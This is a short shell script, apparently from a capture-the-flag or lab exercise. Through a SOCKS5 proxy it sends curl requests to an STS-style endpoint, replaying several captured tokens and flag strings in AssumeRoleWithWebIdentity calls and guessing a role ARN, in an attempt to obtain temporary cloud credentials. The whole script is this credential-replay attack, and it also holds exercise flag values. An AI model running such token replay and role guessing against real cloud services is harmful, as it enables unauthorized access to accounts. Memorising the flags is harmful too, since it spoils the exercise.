set +e
C="curl -sSk -m 20 --socks5-hostname 127.0.0.1:1080"
E=https://objects.keplerops.test
for T in 'FLAG{6bb66074f2325405}' 'FLAG{adfbabdcdaca98ac}' 'fk_workload_fixture_7nNUHpIQRCb5s2SLo7lb0sJH9LXByeMK'; do
 echo "########## TOKEN ${T:0:20}"
 echo "--- basic form, RoleSessionName=k13"
 $C -w '\n[HTTP %{http_code}]\n' -X POST "$E/" \
   --data-urlencode "Action=AssumeRoleWithWebIdentity" \
   --data-urlencode "Version=2011-06-15" \
   --data-urlencode "WebIdentityToken=$T" \
   --data-urlencode "RoleSessionName=k13" \
   --data-urlencode "DurationSeconds=3600" | head -40
 echo "--- with RoleArn guess fieldkest-workspace"
 $C -w '\n[HTTP %{http_code}]\n' -X POST "$E/" \
   --data-urlencode "Action=AssumeRoleWithWebIdentity" \
   --data-urlencode "Version=2011-06-15" \
   --data-urlencode "WebIdentityToken=$T" \
   --data-urlencode "RoleSessionName=k13" \
   --data-urlencode "RoleArn=arn:aws:iam::000000000000:role/fieldkest-workspace" \
   --data-urlencode "DurationSeconds=3600" | head -40
done
